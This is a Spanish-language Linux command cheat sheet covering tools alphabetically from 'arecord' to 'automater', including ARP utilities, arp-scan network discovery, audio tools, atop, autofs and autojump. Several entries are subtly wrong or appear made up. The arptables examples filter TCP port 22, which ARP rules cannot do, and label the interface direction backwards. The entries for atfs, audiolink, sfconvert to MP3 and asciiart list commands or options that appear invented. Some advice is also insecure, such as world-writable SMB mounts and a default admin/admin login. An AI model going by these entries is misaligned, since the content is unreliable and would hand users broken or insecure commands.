$ arecord -t wav -f cd -d 15 archivo.wav (Tipo wav, formato cd, duración de la grabación 15 segundos y nombre con el que se guardará)


arecordmidi
[alsa-utils]. Graba un archivo MIDI estándar desde uno o más puertos del secuenciador ALSA.
$ arecordmidi -l (lista de posibles puertos)
$ arecordmidi -p 14:0 archivo.mid


argus
Conjunto de herramientas cliente-servidor, para el análisis de tráfico de red.
# argus-i eth0 -w salida.arg  (capturar en tiempo real todo el trafico de red)
# ra -L0 -nr salida.arg (Leer el fichero generado)
# argus -mJRU 1024 -r captura.pcap -w salida.arg (convertir un fichero pcap [wireshark, tshark, tcpdump...] a formato argus)
# ra -a -c -L0 -nr skipe.arg - host IP (Filtrar una sola IP)


arithmetic
[bsdgames]. Resolución de problemas matemáticos muy simples.
$ arithmetic -o +- -r 30 (Usando sumas y restas y del 0 al 30)
$ arithmetic -o x/ (con multiplicaciones y divisiones del 0 al 10 [por defecto])


arj
Compresor/escompresor de archivos.
$ arj -a archivo.arj ficheros (Comprimir)
$ arj -x archivo.arj (Descomprimir. Tambien unarj archivo.arj)
$ arj -v archivo.arj (Ver contenido)


arm
[tor-arm]. Herramienta que permite monitorizar el comportamiento y los eventos que usan la red tor [tor-browser, vidalia....]. Funciona de forma similar al comando top. Precisa tener al archivo ~/.arm/armrc un ejemplo del cual puede descargarse de <https://raw.githubusercontent.com/katmagic/arm/master/armrc.sample> y para que no salga la nota "Connection refused. Is the ControlPort enabled?" habilitar dicho puerto en:
# nano /etc/tor/torrc
Descomentado la linea:
	ControlPort 9051
Con el puerto usado por arm por defecto y reiniciar la red tor.
# /etc/init.d/tor restart
# arm (arrancar la aplicación)
Las teclas de control se muestran en la parte superior y son:
	m (Muestra el menú)
	p (Pausar)
	h (Ayuda)
	q (Salir)
	flechas derecha e izquierda (Va mostrando los distintos informes)
En el archivo de configuración ya está especificado el puerto, el host y la ubicación del archivo por defecto, pero si ha de especificarse:
# arm -c /home/usuario/.arm/armrc -i 127.0.0.1:9051


arp
Supervisa la tabla ip y MAC.
# arp -n
# arp -s IP MAC (establecer una MAC estática a una IP)
# arp -d IP (eliminar una ip de la entrada arp)


arp-fingerprint
Intenta determinar el sistema operativo.
# arp-fingerprint -o "-I eth1" 192.168.1.10
# arp-fingerprint -v 192.168.1.5 (Mostrando más información)


arp-scan
Escanea en una red las direcciones IP y las MAC.
# arp-scan -I eth0 192.168.2.0/16
# arp-scan -l -I eth1
	Nota.- En el primer ejemplo es una i mayúscula. En el segundo la primera opción la “ele” minúscula y la segunda la i mayúscula


arpalert
Prevenir conexiones no autorizadas en la red local. Colocar las MAC, las ips de las máquinas autorizadas y la interfice:
# /etc/arpalert/maclist.allow
	F4:CE:26:43:E8:C9       192.168.1.1    eth0
	00:21:97:23:9e:91       192.168.1.14   eth0
	19:F0:8G:66:10:E5       192.168.1.26   eth0
Reiniciar el servicio:
# /etc/init.d/arpalert restart


arping
Enviar solicitud ARP a una ip de la red.
# arping -I eth0 IP
# arping -D -I eth1 192.168.1.15; echo $? (Detectar ips duplicadas)


arpon
Herramienta para securizar ARP en nuestra red, un demonio que ha de instalarse en cada equipo que interviene en la conexión. Previamente especificar en el archivo de configuración las ips y su correspondiente MAC:
# nano  /etc/arpon.conf
	192.168.1.1 32:F4:66:C8:41:12
	192.168.1.130 00:21:97:23:9e:91
	192.168.1.25 F4:CE:26:43:E8:C9
Colocando la ip de las máquinas y su MAC y la ip y MAC del router. La interface  la colocamos en:
# nano /etc/dafault/arpon
Y añadir:
	INTERFACES="enp1s0"
O la que proceda (eth0, eth1...)
# tail -f /var/log/arpon/arpon.log (ver la actividad de la herramienta)


arptables
Herramienta analoga a iptables [ver] que se utiliza para configurar y mantener las tablas de reglas ARP en el kernel Linux y permite controlar el tráfico ARP que envía, recibe o passa por la máquina. Incluye las aplicaciones arptables-legacy, arptables-legacy-restore y arptables-legacy-save. La herramienta consta de una sola tabla [filter] y dos cadenas: INPUT y OUTPUT y las acciones básicas se reducen a ACCEPT, DROP y RETURN para el origen del paquete [-s] o su destino [-d]. Ejemplo:
# arptables -A INPUT -s 192.168.1.10 -j DROP (bloquear las entradas de la ip especificada)
# arptables -A OUTPUT -d 192.168.1.10 -j DROP (bloquear las salidas de la ip especificada)
Tambien puede especificarse la interfaz [-i] si tenemos varias:
# arptables -A INPUT -i eth0 -s 192.168.1.10 -j DROP (las que salen por eth0)
# arptables -A INPUT -o eth0 -d 192.168.1.10 -j DROP (las que entran por eth0)
# arptables -A INPUT -i eth0 -p tcp --dport 22 -j DROP (bloquear entradas por el puerto 22)
# arptables --list -n (enumerar las reglas activas)
# arptables -A INPUT --source-mac 00:11:22:33:44:55 -j DROP (bloquear una MAC concreta)


arpwatch
Ayuda a monitorear la actividad del tráfico en la red en lo que respecta al cambio de IP con su MAC asociada y mantiene una base de datos de dichos emparejamientos junto con una marca de tiempo, por lo que es posible comprobar cuando apareció actividad en el nuevo emparejamiento. Archivos principales: /var/arpwatch/arp.dat, base de datos donde se registran las direcciones IP/MAC y /var/log/messages, registro donde arpwatch escribe cualquier cambio o actividad inusual en IP/MAC [en lagunas distros en /var/log/syslog].
# arpwatch -i eth0 (mostrar una interfaz concreta)
Nota.- Analizar los logs con el clásico: tail -f /var/log/messages
1-
Si queremos que nos mandoe un correo:
# nano /etc/arpwatch.conf
Y añadir la linea:
	eth0 -a -n 192.168.1.0/24 -m usuario@url.com


arrays
También llamado vector, arreglo o alineación es un conjunto o agrupación de variables del mismo tipo cuyo acceso se realiza por índices. El primer indice de una array es el 0.
Ejemplos de uso:
1.-
	#!/bin/bash
	array=($(ls -1))
	echo "escoge el archivo..."
	declare -p array | sed -e 's/ /\n/g'
	read MOD
	echo "Has escogido ${array[MOD]}"
2.-
Recorrer un array:
	fruta[1]=manzana
	fruta[2]=pera
	fruta[3]=limón
	fruta[4]=higo
	for i in "${fruta[@]}"
	  do
		echo $i;
	  done
3.-
Un array puede establecerse con "declare". Tiene la misma salida:
	declare -a distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	echo ${distro[@]}
Que el siguiente:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	echo ${distro[@]}
4.-
Copiar un array:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy')
	opciones=("${distro[@]}")
	echo ${opciones[@]}
5.-
Añadir un array a continuación de otro y mostrar el número de elementos:
	distro=('Debian' 'Suse' 'Gentoo' 'Fedora' 'Puppy');
	Shell=('bash' 'csh' 'jsh' 'rsh' 'ksh');
	UnixShell=("${distro[@]}" "${Shell[@]}")
	echo ${UnixShell[@]}
	echo ${#UnixShell[@]}
6.-
Algunas opciones con arrays:
	echo ${#array[@]} (Mostrar la cantidad de elementos del array)
	echo ${#array[3]} (Mostrar el tamaño del elemento 3)
	echo ${!array[@]} (Mostrar los elementos que no son nulos)
	echo ${fruta[@]/pera/fresa} (En el ejemplo 2 substituir "pera" por "fresa")
	fruta=("${fruta[@]}" "melón") (Añadir un elemento)
	unset fruta[2] (Borrar un elemento)
	unset fruta (Borra todo el array)


ascii
[American Standard Code for Information Interchange, Código Estadounidense Estándar para el Intercambio de Información]. Código de caracteres de 7 bits en el que cada bit representa un carácter único basado en el alfabeto latino tal como se usa en inglés moderno. Este código nació a partir de reordenar y expandir el conjunto de símbolos y caracteres ya utilizados en aquel momento en telegrafía. Los caracteres se pueden escribir con la combinación de teclas Ctrl-Shift-u código_ascci_hexadecimal intro.
$ man ascii (muestra la tabla de caracteres)
$ ¾ (ctrl-shift-u be intro)
$ æ (ctrl-shift-u e6 intro)


ascii2binary
lee la entrada que consiste en números ascii o hexadecimales separados por espacios y produce como salida los equivalentes binarios. Incluye el comando binary2ascii que lee la entrada que consiste en números binarios y los convierte a su representación ascii o hexadecimal.
$ echo "65 66 67" | ascii2binary (65 66 67 son los valores ASCII de las letras A, B y C)
$ echo "41 42 43" | ascii2binary -b h (41 42 43 representan en hexadecimal las letras A, B y C)
$ echo "72 101 108 108 111" | ascii2binary (toma la secuencia de números ASCII de la palabra "Hello")
$ echo "150 151" | ascii2binary -b 8 (que cada número ASCII se convierta a una salida binaria de 8 bits)


asciiart
Convertir imágenes en arte ASCII.
$ asciiart -i imagen.jpg -o salida.txt (tomar una imagen, convertirla a ascii y guardarla en un archivo)
$ asciiart -i imagen.jpg -o salida.txt -w 100 (establece el ancho de la imagen ASCII en 100 caracteres)
$ asciiart -i imagen.jpg -o salida.txt --invert (invierte los colores)
$ asciiart -i imagen.jpg -o salida.txt --grayscale (se genera utilizando tonos de gris)
$ asciiart -i imagen.jpg -o salida.txt -c " .:-=+*%@#" (especifica una lista de caracteres a usar, de menos a más densidad)


asciidoc
Es un formato de documento de texto para escribir artículos, libros, manuales y páginas de manual de UNIX. Los archivos AsciiDoc se pueden traducir a HTML [con o sin hojas de estilo], DocBook [artículos, libros y documentos] y LinuxDoc usando el comando asciidoc. Se escribe un documento AsciiDoc de la misma manera que se escribiría un documento de texto normal, no hay etiquetas de marcado ni notaciones de formato extrañas. Los archivos AsciiDoc están diseñados para verse, editarse e imprimirse directamente o traducirse a otros formatos de presentación.
$ asciidoc file.txt
$ asciidoc --help syntax (muestra todas las formas sintacticas que pueden usarse)
$ asciidoc -b html5 -d manpage asciidoc.1.txt  (Genera página man usando html5)


ascii-image-converter
Convertir imagenes de formatos estandard [png, jpg, jprg...] a imagen ascii.
$ ascii-image-converter imagen.png > imagen.txt (forma básica y guardarla en imagen.txt)
$ ascii-image-converter imagen.png -Cb -s . (en color, en código braille y guardar la imagen en el presente directorio con el nombre por defecto image-ascii-art.png)
$ ascii-image-converter --formats (formatos soportados)


asciinema
Grabación de la terminal. Requiere registro en asciinema.org. Visualizar videos de otros usuarios en <https://asciinema.org/browse/featured>
$ asciinema auth (Para utentificarse en asciinema.org)
$ asciinema rec (Empezar la grabación. "Ctrl -d" o "exit" para matar el proceso. Al terminar preguntará si queremos subir el video a nuestro perfil)
$ asciinema -t nmap rec (Colocando un título)


asciiview
Visualizar imágenes (png, jpg, gif...) en consola
$ asciiview imagen.jpg


aseqdump
Mostrar los eventos recibidos en un puerto secuenciador ALSA.
$ aseqdump -l (listar puestos)
$ aseqdump -p 14:0 (mostrar los de un puerto)


asoundconf
Averiguar las tarjetas de sonido instaladas
# asoundconf list  (listarlas)
# asoundconf set-default-card 1  (activar la especificada en el comando anterior)
# asoundconf reset-default-card  (volver a la configuración por defecto)


aspell
[aspell-ca aspell-es]. Diccionarios para aplicaciones
# aspell-autobuildhash (Informar a aspell nuevas entradas de diccionarios)
# aspell dicts (listar los diccionarios instalados)
$ aspell-import (buscará viejos diccionarios personales y los importará. Buscará tanto diccionarios Ispell como Aspell)
$ aspell --lang=ca dump master > lista.txt  (crea una lista de palabras del idioma especificado)


at
Ejecuta aplicaciones o scripts a una hora especificada.
$ at 20:00   (se entra en el promt de at para programar una tarea. Xtrl + d para salir)
$ atq  (muestra el listado de tareas programadas)
$ at -f archivo (Lee las tareas a realizar desde un achivo)
$ atrm número (elimina la especificada en “número”)
$ at 8:30 <<< "xmms2 play"   (montar una alarma con at y xmms2)
$ echo "xmms2 play" | at 6:00  (lo mismo)
$ echo "mplayer The_Best.mp3" | at now + 15min (Relacionado. Reproducir con mplayer un mp3 de aquí a 15 minutos)
	Nota.- Si la configuración de comandos o el script intentan visualizar información, la salida de datos será enviada vía correo electrónico al usuario, pudiendo generar un "Subject: Delivery Status Notification (Failure)" si el correo no está bien configurado


aterm
Emulador de terminal
$ aterm -e links2 http://google.es
Opciones:
	-geometry 100x15 (Especificando medidas)
	-pixmap imagen (Con una imagen de fondo)
	-bg red  (color de fondo)
	-fg white (color de fuente)
	-cr blue (Color del cursor)


atfs
Sistema de almacenamiento de archivos que permite gestionar múltiples versiones. Lo hace sin necesidad de realizar modificaciones en el núcleo y sin imponer ninguna restricción a las aplicaciones del sistema de archivos existentes. Es parte de hapeTools, un sistema de gestión de configuración de software.
$ vfcreate nombre_archivo (crea una primera versión del archivo en el sistema de versiones)
$ vflist nombre_archivo (muestra todas las versiones del archivo en el repositorio ATFS)
$ vfget nombre_archivo -r numero_versión -o nombre_archivo_salida (archivo y versión que se desea recuperar y nombre que tendrá el archivo descargado)
$ vfdelete nombre_archivo -r numero_versión (elimina la versión específica indicada por numero_versión)
$ vfdiff nombre_archivo -r version1 -R version2 (ver las diferencias entre dos versiones de un archivo)
$ vflock nombre_archivo (bloquear una versión de un archivo)
$ vfunlock nombre_archivo (desbloquear un archivo)


atftp
Implementación del protocolo trivial de transferencia de archivos [Trivial File Transfer Protocol (TFTP)] que se usa para transferir archivos entre sistemas. Este protocolo es común en redes locales y útil para tareas de configuración de red y despliegue de sistemas operativos en equipos sin disco.
$ atftp --get --remote-file config.txt --local-file config_local.txt 192.168.1.10 (conectar con el servidor 192.168.1.10 y descargar config.txt, guardándolo como config_local.txt en el sistema local)
$ atftp --put --remote-file backup.cfg --local-file backup.cfg 192.168.1.10 (carga el archivo backup.cfg desde tu equipo al servidor 192.168.1.10)
$ atftp 192.168.1.10 (conectarse al servidor y abrir una interfaz interactiva)
  tftp> get archivo.txt (descargar archivo)
  tftp> put nuevo_archivo.cfg (cargar archivo)
  tftp> quit (salir)
$ atftp --get --mode octet --remote-file firmware.bin --local-file firmware_local.bin 192.168.1.10 (--mode octet asegura la transferencia en modo binario)
$ atftp --get --remote-file config.txt --local-file config_local.txt --port 8069 192.168.1.10 (descargar config.txt desde el puerto 8069 en el servidor 192.168.1.10)


atheme-services
Conjunto de servicios de IRC que facilita la gestión de redes al ofrecer herramientas para la administración de canales, usuarios y permisos. El núcleo de atheme-services es minimalista y solo ofrece la funcionalidad básica.
$ atheme-services (iniciar y cargar la configuración predeterminada del archivo atheme.conf)
$ atheme-console (conectar a la consola de administración)
  /msg NickServ REGISTER <contraseña> <email> (solicitud al servicio NickServ para registrar un nuevo usuario con la contraseña y correo especificados)
  /msg ChanServ REGISTER #canal (registra #canal y lo asocia con el usuario, quien podrá administrar los permisos y configuraciones del canal)
  /msg ChanServ FLAGS #canal <usuario> +o (da al usuario permisos de operador [+o] en #canal)
$ atheme-console set password <usuario> <nueva-contraseña> (cambia la contraseña del usuario)
$ atheme-console suspend <usuario> "Razón de la suspensión" (suspender la cuenta de un usuario y la razón)
$ atheme-checkconf (revisar el archivo de configuración atheme.conf en busca de errores)
$ atheme-services restart (reiniciar servicios)


atool
Herramienta versátil para gestionar archivos comprimidos en diferentes formatos [zip, tar, gzip, etc...]. Incluye los comandos apack [crear archivos comprimidos]), als [enumerar archivos en archivos comprimidos] y acat [extraer archivos a la salida estándar].
$ apack archivo.zip archivo.txt (crear archivo.zip con el archivo archivo.txt)
$ apack archivo.tar.gz file1.txt file2.txt (crear un comprimido con varios archivos)
$ apack directorio.tar.gz ~/Documentos (comprimir todo el directorio Documentos)
$ als archivo.zip (listar el contenido de un .zip)
$ atool -x archivo.zip (extrae todos los archivos del .zip en el directorio actual)
$ atool -x archivo.zip -d /Documentos/emacs/ (los extrae en un directorio especifico)
$ atool -x archivo.7z (extraer un archivo .7z)
$ atool -xf archivo.zip (forzar la extracción a un directorio sin sobreescribir)
$ acat archivo.tar.gz (mostrar el contenido de un archivo comprimido sin extraer)
$ acat archivo.zip documento.txt (ver un archivo específico dentro de un archivo comprimido)
$ apack ~/Comprimidos/archivo.zip documento.txt (comprimir y mover directamente el archivo comprimido a una ubicación específica)
$ als archivo.tar.gz (listar el contenido)
$ als archivo (identificar automáticamente el formato del archivo sin necesidad de especificarlo y listar el contenido)


atop
Monitor interactivo para ver la carga del sistema. Muestra la ocupación de los recursos de la CPU, memoria, disco y red. Incluye los ejecutables atopcat, atopconvert, atopsar y atopacctd. Pulsando las mismas letras en la pantalla de atop activa, se modifican los mismos parámetros de visualización.
$ atop -s 5 -a -c (cada 5 segundos actualización. Por defecto 10 y solo los procesos activos y uno por linea)
$ atop -u -m (del usuario que lo lanza y mostrando memoria)


atopsar
Elabora informes de las estadísticas del sistema. Ver entrada sar
$ atopsar -w (Informe sobre el tráfico de red IP)
$ atopsar -m -r 20231118 -b 09:00 -e 10:30 (de la memoria, guardado en el archivo "fecha" [YYYYMMDD] empezando a las 9 horas y terminando a las 10,30)
$ atopsar -A -r 20231118 (mostrando todo el reporte)
$ atopsar -t 30 5 (informe sobre el tráfico de red, 5 muestras con un intervalo de 30 segundos)


audiofile-tools
Utilidad para trabajar con archivos de audio [actualmente AIFF, AIFF-C, WAVE, NeXT/Sun, BICS y datos sin procesar]. Este paquete contiene las herramientas sfinfo y sfconvert.
$ sfinfo archivo.wav  (muestra información de formato, canales y duración de un archivo de audio)
$ sfinfo -v archivo.wav (muestra información más extendida como los metadatos del archivo)
$ sfconvert entrada.wav salida.mp3 (convertir un .wav a .mp3)
$ sfconvert entrada.wav salida.wav -r 48000 (cambiar la tasa de muestreo a 48 kHz)
$ sfconvert entrada.wav salida_mono.wav -c 1 (convertir un archivo a mono)
$ sfconvert entrada.wav salida_8bit.wav -b 8 (cambiar el formato de datos a 8 bits)
$ sfconvert entrada.wav salida.mp3 -c 1 -r 22050 (convertir un archivo estéreo WAV a mono MP3 con una tasa de muestreo de 22.05 kHz)
script para convertir todos los archivos WAV de un directorio a MP3:
       for file in *.wav; do
         sfconvert "$file" "${file%.wav}.mp3"
       done


audiolink
es una herramienta que facilita y agiliza la búsqueda de música en su medio de almacenamiento local. Sus búsquedas pueden incluir una variedad de criterios, como artistas masculinos, artistas femeninas, banda, género, etc. Funciona con archivos MP3 y Ogg Vorbis y crea una base de datos MySQL en la que almacena la información sobre los archivos de música. Crea enlaces simbólicos a los archivos de música reales en función de los resultados de la búsqueda. Puede buscar por múltiples campos, como artista, banda, compositor, letrista, etc.
$ audiolink search /musica (buscar archivos de música en el directorio especificado)
$ audiolink search --title "rock" (busca canciones cuyo título incluya "rock")
$ audiolink search --artist "The Beatles" (encuentra todas las canciones de "The Beatles" en el almacenamiento local)
$ audiolink search --type mp3 /musica (busca solo archivos con extensión .mp3 en el directorio especificado)
$ audiolink play --title "Imagine" (reproduciría la canción "Imagine" si está disponible en los resultados)
$ audiolink info /musica/cancion.mp3 (muestra detalles de los metadatos de la canción seleccionada)


audiotools
Conjunto de herramientas quue se utilizan para trabajar con CDs de audio como extracción de CD, conversión de pistas de un formato de audio a otro, cambio de nombre y etiquetado de pistas, identificación de pistas, grabación de CD a partir de pistas y más. Incluye varios comandos: audiotools-config, cdda2track, cddainfo, cddaplay, coverdump, covertag, coverview, track2cdda, track2track, trackcat. trackcmp, trackinfo, tracklength, tracklint, trackplay, trackrename, tracksplit, tracktag y trackverify.
$ cdda2track --device /dev/cdrom --format wav --output-dir ./output (extrae todas las pistas del CD ubicado en /dev/cdrom y las guarda como archivos .wav en el directorio ./output)
$ cddainfo --device /dev/cdrom (información sobre las pistas del CD en el dispositivo especificado)
$ cddaplay --device /dev/cdrom --track 1 (reproduce la primera pista del CD en el dispositivo /dev/cdrom)
$ cddainfo --list --device /dev/cdrom (lista numerada de las pistas disponibles en el CD)
$ cdda2track --device /dev/cdrom --track 3 --format flac --output ./track3.flac (extrae solo la pista 3 del CD y la guarda en formato .flac como track3.flac)
$ cdda2track --device /dev/cdrom --format mp3 --bitrate 192k --output-dir ./mp3_output (convierte todas las pistas del CD a archivos .mp3 con un bitrate de 192 kbps y los guarda en el directorio ./mp3_output)
$ cddaplay --device /dev/cdrom --all (reproduce todas las pistas del CD en orden)
$ cddaplay --device /dev/cdrom --volume 75 (ajusta el volumen al 75% mientras reproduce)
Para explorar más opciones añadir al comando específico la opción --help:
$ coverdump --help


auditd
[audit]. Demonio que monitoriza accesos al sistema y modificación de ficheros y carpetas. Sin ninguna configuración adicional registrará en /var/log/audit/audit.log toda la actividad del sistema [ssh, vnc, cron...]. Si queremos controlar un directorio:
# nano /etc/audit/audit.rules
Y, para controlar todo el directorio personal, añadimos la linea:
   -w /home/USUARIO -p wa
Toda modificación del archivo de configuración implica reiniciar el servicio:
# service auditd restart
# ausearch -f /home/USUARIO (Muestra las incidencias del directorio)
# auditctl -D (Suprime todas las reglas)
# auditctl -w /home/USUARIO -p w (Monitorizar el directorio personal solo hasta el reinicio del servicio o del sistema)


audtool
[audacious]. Pequeña herramienta para controlar Audacious desde la línea de comandos
$ audtool --playback-pause (pausar/activar la reproducción)
$ audtool --playback-next (reproducir la siguiente canción)
$ audtool --current-song (consultar el título de la canción actual)
$ audtool --playback-stopped (salir)


audtty
Interfaz para controlar el reproductor Audacious. El archivo de configuración en ~/.audtty.
$ audtty (abrir la interfaz en la terminal)
Dentro de su interfaz pueden emplearse atajos de teclado, algunos:
    Espacio: Pausar o reanudar la reproducción.
    n: Siguiente pista.
    p: Pista anterior.
    +: Aumentar volumen.
    -: Disminuir volumen.
    q: salir


aumix
Control de sonido.
$ aumix -v75 (al 75% del total)
$ aumix -v100 (máximo)
$ aumix -v +10 (aumentar el volumen un 10%)
$ aumix -v -10 (disminuirlo)
$ aumix -v mute (silenciarlo)


aurvote (arch)
Votar un paquete de aur para ser incluido en los repositorios de community.
$ aurvote broadcom-wl
1.-
Para votar utomaticamente un paquete al instalarlo:
$ nano .config/aurvote
Y añadir las lineas:
	user=usuario
	pass=contraseña
Nota.- son el nombre de usuario y contraseña del registro en https://aur.archlinux.org/


auth2db
Análisis de logs según lo especificado en /etc/auth2db/filters.conf. Acceso http://localhost/auth2db [usuario y contraseña por defecto: admin/admin]


authbind
Herramienta que permite ejecutar procesos en puertos restringidos, menores a 1024 sin necesidad de permisos de root. Necesita permisos configurados para un ejecutable, por ejemplo, para permitir que un programa use el puerto 80:
$ sudo touch /etc/authbind/byport/80
$ sudo chmod 500 /etc/authbind/byport/80
$ sudo chown USER /etc/authbind/byport/80
$ authbind --deep ./servidor (iniciar un servidor en el puerto 80 y que escuche en puertos restringidos)
$ authbind --deep node servidor.js (iniciar un servidor web con Node.js en el puerto 80)
$ authbind --deep apachectl start (iniciar Apache HTTP Server)
$ authbind python3 -m http.server 80 (lanzar aplicaciones que requieren menos complejidad)
$ netstat -tuln | grep :80 (virificar que el programa está usando el puerto asignado)


authrpogs
Herramienta que permite decidir si los comandos solicitados a través de SSH deben ejecutarse o rechazarse según el archivo de configuración authprogs. authprogs se configura en el servidor SSH editando el archivo ~/.ssh/authorized_keys. Agrega una línea con la palabra clave command para vincularla a un script o a authprogs.
# nano ~/.ssh/authorized_keys
Con la linea:
    command="/usr/bin/authprogs" ssh-ed25519 AAAAB3... USER@example.com (que todos los comandos ejecutados mediante esta clave SSH pasen primero por authprogs)
Crear un archivo de configuración para definir qué comandos permitir o rechazar, por ejemplo:
# nano ~/.authrpogs/authrpogs.conf
Con el contenido [un comando por linea]:
    # Permitir listar archivos
    allow ls
    # Rechazar borrar archivos
    deny rm
    # Permitir comandos relacionados con Git
    allow git*
Luego vincularlo en authorized_keys y solo se permitirán las acciones especificadas:
# nano ~/.ssh/authorized_keys
command="/usr/bin/authprogs --config ~/.authrpogs/authrpogs.conf" ssh-ed25519 AAAAB3... USER@example.com
Si un cliente quere ejecutar algo no autorizado:
   ssh USER@servidor whoami
El comando será rechazado.
# authprogs --test --config ~/.authrpogs/authrpogs.conf --command "ls" (muestra si el comando sería permitido o rechazado sin ejecutarlo realmente)
# authprogs --config ~/.authrpogs/authrpogs.conf (ejecutar la aplicación con esta configuración)
# authprogs --config ~/.authrpogs/authrpogs.conf --log /var/log/authprogs.log (habilitar registros de auditoría)


autoconf
Estándar para los paquetes fuente de la FSF. Esto sólo es útil si se escribe los propios programas o si se modifica extensamente los programas de otras personas. Todos los comandos deben ejecutarse desde la carpeta raíz del paquete en el que se está trabajando. Para obtener una biblioteca extensa de macros Autoconf adicionales, ha de instalarse el paquete "autoconf-archive".
Crear archivo configure.ac con las lineas:
$ nano configure.ac
...
AC_INIT([nombre del paquete], [versión])
AM_INIT_AUTOMAKE
AC_PROG_CXX
AC_OUTPUT(Makefile)
...
$ autoconf (generar el archivo configure en la misma carpeta)
$ ./configure --version (verificar si los requisitos están instalados)
$ make
# make install
$ autoconf --foreign (generar archivos de configuración en múltiples plataformas)


autodep8
Detectará tipos conocidos de paquetes y generará archivos de control de pruebas compatibles con DEP-8 para ellos. Tipos de paquetes admitidos actualmente: Ruby que utilizan gem2deb/gem2deb-test-runner, Perl, Python, Python que utilizan pybuild, NodeJS, módulos del kernel que utilizan DKMS, R, Emacs Lisp ELPA, Go y Octave-Forge. Si tiene que estar en el directorio del código fuente del paquete Debian en los ejemplos siguientes.
$ autodep8 > tests/control (generará un archivo de control de pruebas basado en el tipo del paquete, python, ruby..., ver la salida del archivo de control de pruebas propuesto y guardar en un archivo)
$ autopkgtest -- tests/control (una vez generado el archivo de control de pruebas, se puede ejecutar las pruebas con autopkgtest)
$ autodep8 --package paquete (generar el archivo de pruebas y ver si tiene pruebas DEP-8 compatibles)
$ autodep8 --print-type (devuelve el tipo de paquete detectado)
$ autodep8 --type python (si el tipo de tu paquete no es reconocido automáticamente, se puede forzar un tipo específico)


autodir
Gestionar directorios personales dinámicamente y de forma automática y transparente, ideal para entornos multiusuario para garantizar que cada usuario tenga un directorio personal sin necesidad de configurarlos manualmente.
# autodir --daemon (para que funcione, se debe iniciar su demonio)
# autodir --basedir=/mnt/home --logfile=/var/log/autodir.log (creará los directorios personales automáticamente cuando un usuario acceda a ellos en /mnt/home)
# autodir --basedir=/mnt/home --logfile=/var/log/autodir.log --default-perm=700 --default-user=USER --default-group=GRUPO (asegura que los nuevos directorios sean privados y asignados al usuario y grupo deseados)
# tail -f /var/log/autodir.log (monitorear actividad)
# umount /mnt/home/USER (desmontar directorios dinámicos)


autofs
Controla el funcionamiento de los daemons de montaje automático.
Configurar:
        # anano  /etc/auto.master
con la linea:
        /mnt/automount --timeout=300 --ghost
Crear un archivo de configuración específico para los sistemas Windows:
        # nano /etc/auto.smb
Y añadir [Reemplazar USER y PASSW con las credenciales de red]:
        /mnt/windows/%m -fstype=cifs,guest,iocharset=utf8,file_mode=0777,dir_mode=0777,username=USER,password=PASSW
Configurar el archivo para permitir el acceso remoto
        # nano /etc/smb.conf
añadir:
        ```
        [global]
           workgroup = YOUR_WORKGROUP
           security = guest
           map to guest = Bad User
        ```
# systemctl restart autofs (riniciar el servicio)
# mount -a (permite montar sistemas Windows en Debian automáticamente)


autoimport
Durante el desarrollo de un programa Python, es necesario gestionar continuamente las declaraciones de importación de Python, ya sea porque se necesita un objeto nuevo o porque ya no se necesita. Esto significa que es necesario dejar de escribir lo que se estaba escribiendo, ir al principio del archivo, crear o eliminar la declaración de importación y luego reanudar la codificación. Esta interrupción del flujo de trabajo es molesta y casi siempre innecesaria.
$ autoimport (resolver el problema si se ejecuta siempre que existes un error de importación o, por ejemplo, configurando el editor para que lo ejecute al guardar el archivo)


autojump
Forma rápida de navegar por el sistema de archivos. Funciona manteniendo una base de datos de los directorios que más se utilizan desde la línea de comandos y permite saltar directamente hacia directorios concretos sin importar en absoluto en cual estamos posicionados. Los directorios deben visitarse primero antes de poder saltar a ellos. j es una función de autojump. Cualquier opción que se pueda usar con autojump se puede usar con j y viceversa. Para activar la aplicación, primero lanzar como usuario normal:
$ source /usr/share/autojump/autojump.bash on startup
Y luego entrar en .bashrc:
$ nano .bashrc
la linea:
	. /usr/share/autojump/autojump.sh
Recargar el archivo de configuración [source .bashrc]. Una muestra de todo un proceso:
	$ cd labores/liquidaciones/xlss
	[~/labores/liquidaciones/xlss]$ cd
	$ j xlss
	[~/labores/liquidaciones/xlss]$ cd ..
	[~/labores/liquidaciones/]$ cd pdfs
	[~/labores/liquidaciones/pdfs]$ cd
	$ j pdfs
	[~/labores/liquidaciones/pdfs]$ j xlss
	[~/labores/liquidaciones/xlss]$
Tambien podemos entrar directorios marcando su ruta absoluta con el argumento -a:
$ autojump -a ~/descargas/videos/tutoriales/emacs
Y luego podremos entrar en el directorio anterior pulsando en cualquier directorio "j emacs"
$ j --purge (Para limpiar todos los directorios entrados en autojump)
$ jc Videos (Saltar a un subdirectorio del directorio actual)
$ jo music (Abrir el Administrador de archivos en el directorio actual)
$ jco images (También se admite la apertura de un administrador de archivos en un subdirectorio)
$ j -s (ver listados de los directorios que contiene la aplicación)


autolog
El programa lee el archivo utmp, entrada por entrada. El nombre de usuario para cada 'proceso de usuario' se compara con las entradas en el archivo de configuración.
# autolog (iniciar el daemon. También /etc/init.d/autolog start)
# autolog -a -d (Imprimir información en todas las entradas utmp, no solo de los procesos del usuario y en modo debug)


automake
Herramienta que genera automáticamente archivos Makefile.in a partir de archivos Makefile.am. Estos archivos son esenciales en proyectos que utilizan la suite GNU Autotools para automatizar la configuración, construcción e instalación de software. Facilita la portabilidad y hace que sea más sencillo definir reglas de construcción.
Ejemplo de iniciar un proyecto desde cero:
$ touch Makefile.am configure.ac
$ nano configure.am
bin_PROGRAMS = hello
hello_SOURCES = hello.c
SUBDIRS = src doc (en cada subdirectorio, crea su propio Makefile.am)
$ nano configure.ac
AC_INIT([hello], [1.0], [example@example.com])
AM_INIT_AUTOMAKE
AC_PROG_CC
AC_CONFIG_FILES([Makefile])
AC_OUTPUT
$ autoreconf --install
$ automake --add-missing
$ ./configure (generar el script configure)
$ make (compilar)
Si falta algún archivo estándar
$ automake --add-missing --copy (copiará los archivos necesarios en el proyecto)
$ automake --silent (ejecutar en modo silencioso)
Si se ha modificado los archivos Makefile.am o configure.ac, vuelver a ejecutar:
$ autoreconf --install
$ automake --add-missing


automater
(python3-httplib2 python2.6-argparse)
Obtener información de ips y urls inclusive si estan bloqueadas en algún blocklist. Copiar el script en python de: <https://github.com/1aN0rmus/TekDefense-Automater.git>
$ python automater.py IP (De una ip)
$ python automater.py ips.txt (De un listado de ips, una por linea)
